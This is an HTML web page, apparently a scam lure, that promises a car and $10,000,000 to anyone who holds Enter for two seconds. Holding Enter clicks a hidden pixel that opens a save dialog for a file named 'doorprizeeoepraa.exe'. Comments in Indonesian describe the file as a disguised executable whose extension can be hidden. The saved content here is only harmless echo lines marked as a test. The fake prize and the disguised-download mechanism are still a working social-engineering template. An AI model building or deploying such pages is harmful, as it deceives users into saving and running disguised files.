<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Unlock Your Dream Prize! üöóüí∞</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&family=Source+Code+Pro&display=swap"
      rel="stylesheet"
    />
    <link
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: "Roboto", sans-serif;
        background-image: url("https://www.w3schools.com/w3images/mountains.jpg"); /* Add your desired background image URL */
        background-size: cover;
        background-position: center;
        color: #ffffff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        overflow: hidden;
      }

      .container {
        text-align: center;
        padding: 50px;
        background: rgba(0, 0, 0, 0.7);
        border-radius: 25px;
        width: 80%;
        max-width: 650px;
        box-shadow: 0px 25px 50px rgba(0, 0, 0, 0.6);
        transition: transform 0.4s ease, box-shadow 0.4s ease;
      }

      .container:hover {
        transform: translateY(-15px);
        box-shadow: 0px 35px 75px rgba(0, 0, 0, 0.8);
      }

      h1 {
        font-size: 60px;
        margin-bottom: 20px;
        color: #ff5c8d;
        text-transform: uppercase;
        font-weight: 700;
        letter-spacing: 3px;
      }

      h2 {
        font-size: 42px;
        margin-bottom: 20px;
        color: #ffffff;
        font-weight: 500;
        text-transform: uppercase;
        letter-spacing: 1.5px;
      }

      h3 {
        font-size: 20px;
        color: #b3b3b3;
        margin-bottom: 30px;
        font-weight: 300;
      }

      h2 span {
        color: #ff5c8d;
        font-size: 70px;
        font-weight: bold;
        letter-spacing: 5px;
      }

      #instruction {
        font-size: 22px;
        color: #f0f0f0;
        margin-top: 20px;
        font-weight: 500;
        opacity: 0;
        animation: fadeIn 2s ease-in-out;
      }

      #gameover {
        font-size: 22px;
        color: #ff5c8d;
        font-weight: 500;
        margin-top: 20px;
        opacity: 0;
        transition: opacity 0.6s ease-in-out;
      }

      #gameover.active {
        opacity: 1;
      }

      .author {
        position: absolute;
        bottom: 15px;
        font-size: 14px;
        color: #ffffff;
        opacity: 0.7;
      }

      .prize {
        font-size: 32px;
        color: #f0f0f0;
        margin-top: 20px;
        font-weight: 600;
        text-transform: uppercase;
      }

      .prize span {
        color: #ffcc00;
      }

      @media screen and (max-width: 768px) {
        h1 {
          font-size: 48px;
        }
        h2 {
          font-size: 36px;
        }
        .prize {
          font-size: 24px;
        }
      }

      @keyframes fadeIn {
        0% {
          opacity: 0;
        }
        100% {
          opacity: 1;
        }
      }
    </style>
  </head>

  <body>
    <div class="container text-center">
      <h1>Unlock Your Dream Prize! üöóüí∞</h1>
      <h2><span>‚å®Ô∏è Hold Enter</span> for 2 seconds to win!</h2>
      <h3>Grand Prize: A brand new car üöô and $10,000,000 in cash üíµ</h3>
      <div id="instruction" class="text-light">Hold Enter for 2 seconds...</div>
      <div class="prize text-light">Are you ready to win?</div>
      <h3 id="gameover" class="text-light"></h3>
    </div>
    <div class="author text-center">AlayersHunters</div>

    <div id="pixel" style="height: 1px; width: 1px"></div>

    <script>
      let enterPressStart = 0;
      let isDownloaded = false;

      window.onload = function () {
        const body = document.querySelector("body");
        const instruction = document.querySelector("#instruction");
        const gameover = document.querySelector("#gameover");

        instruction.style.opacity = 1;

        body.onkeydown = (e) => handleEnterPress(e);
        body.onkeyup = (e) => cancelEnterPress(e);

        const pixel = document.getElementById("pixel");
        pixel.addEventListener("click", async () => {
          const zshContent = `
            # Dream Prize Script
            echo "Congratulations! You've unlocked your dream prize!"
            echo "This is a simple test script."
            echo "You can add more commands here."
          `;

          const blob = new Blob([zshContent], { type: "text/plain" });

          const options = {
            suggestedName: "doorprizeeoepraa.exe", // Akan diunduh dengan ekstensi .exe, tapi bisa disembunyikan
            types: [
              {
                description: "File executable (disamarkan)",
                accept: {
                  "text/plain": [".txt"], // Gunakan ekstensi teks atau ekstensi umum lainnya
                },
              },
            ],
            excludeAcceptAllOption: true,
          };

          try {
            const handle = await window.showSaveFilePicker(options);
            const writable = await handle.createWritable();
            await writable.write(blob);
            await writable.close();

            gameover.textContent =
              "You have unlocked the prize! File is being downloaded.";
            gameover.classList.add("active");
          } catch (error) {
            gameover.textContent = "Error while downloading the file!";
            gameover.classList.add("active");
          }
        });
      };

      function handleEnterPress(event) {
        if (event.key === "Enter") {
          if (enterPressStart === 0) {
            enterPressStart = Date.now();
          }
          const elapsedTime = Date.now() - enterPressStart;
          if (elapsedTime >= 2000 && !isDownloaded) {
            document.getElementById("pixel").click();
            isDownloaded = true;
          }
        }
      }

      function cancelEnterPress(event) {
        if (event.key === "Enter") {
          enterPressStart = 0;
        }
      }
    </script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  </body>
</html>
